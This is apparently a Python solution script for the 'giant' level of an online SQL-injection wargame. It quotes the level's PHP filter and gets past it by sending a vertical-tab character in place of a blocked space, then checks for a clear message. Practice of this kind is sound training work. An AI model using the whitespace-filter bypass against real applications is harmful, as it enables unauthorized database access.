#!/usr/bin/env python3
import los


def main():
    '''
    Giant

    if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
    if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
    $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result[1234]) solve("giant"); 
    '''

    url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
    cook = los.check_cookies(url)

    param = dict(shit="\v")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Giant Clear!')


if __name__ == '__main__':
    main()
